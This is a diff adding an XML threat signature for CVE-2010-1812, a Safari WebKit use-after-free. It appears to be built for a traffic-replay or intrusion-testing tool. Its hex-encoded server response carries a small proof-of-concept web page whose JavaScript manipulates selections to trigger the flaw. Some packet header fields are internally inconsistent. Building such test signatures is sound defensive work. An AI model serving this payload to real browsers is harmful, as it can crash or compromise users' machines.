@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Apple Safari WebKit Selections Use After Free (IPv6 Version)"/>
+    <EngDesc display="true" value="A code execution vulnerability exists in Apple Safari WebKit. The vulnerability is due to a use-after-free error when processing a stale pointer using element focus. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted web page.In attack scenarios where code execution is successful the behaviour of the target machine would depend entirely on the intention of the injected code, which would run within the security context of the logged on user. In situations where code execution is not successful, the vulnerable application may terminate abnormally.Note that TELUS Security Labs team has not been able to reproduce this vulnerability using the Apple Safari web browser during the contractual research period. Further investigation is required to understand under what circumstances the vulnerability can be triggered."/>
+    <Intent display="true">
+      <item value="Corruption"/>
+    </Intent>
+    <Protocol display="true" value="IPv6,HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple_Computer"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Safari"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="4.x_prior_to_4.1.3"/>
+      <item value="5.x_prior_to_5.0.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20101123-06"/>
+    <CVEID display="true" value="CVE-2010-1812"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Jim Liu"/>
+    <ID display="true" value="9477f194bf37ff5ed3b585be00d50235"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634282037721388619"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1293013823" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="C"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:E3:16:F0" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="4647" destPort="$HTTPdestPort" SeqNumber="3C2560DD" AckNumber="505340A1" HeaderLength="05" WindowSize="FAF0" Checksum="0B9B" UrgentPointer="0000" Options="" Payload="474554202F7E6A7869612F706F632E68746D6C20485454502F312E310D0A486F73743A203137322E31362E312E320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D555329204170706C655765624B69742F3533332E313620284B48544D4C2C206C696B65204765636B6F292056657273696F6E2F352E30205361666172692F3533332E31360D0A4163636570743A206170706C69636174696F6E2F786D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C746578742F68746D6C3B713D302E392C746578742F706C61696E3B713D302E382C696D6167652F706E672C2A2F2A3B713D302E350D0A4163636570742D4C616E67756167653A20656E2D55530D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:E3:16:F0" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$HTTPdestPort" destPort="4647" SeqNumber="505340A1" AckNumber="3C256241" HeaderLength="05" WindowSize="1920" Checksum="36F9" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C203233204E6F7620323031302032303A34363A353820474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205475652C203233204E6F7620323031302032303A34343A323220474D540D0A455461673A2022333862386565372D3132332D34393562653666666362353830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203239310D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A3C686561643E0A3C73637269707420747970653D22746578742F6A617661736372697074223E0A66756E6374696F6E206C6F616428290A7B0A202077696E646F772E67657453656C656374696F6E28292E73656C656374416C6C4368696C6472656E202874657374293B0A0A2020746573742E7374796C652E646973706C6179203D20276E6F6E65273B0A202077696E646F772E67657453656C656374696F6E28292E72656D6F7665416C6C52616E67657328293B0A7D0A3C2F7363726970743E0A3C2F686561643E0A3C626F6479206F6E4C6F6164203D20226C6F6164282922203E3C6469762069643D746573743E2054656C7573205365637572697479204C6162733C2F6469763E203C2F626F64793E690A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
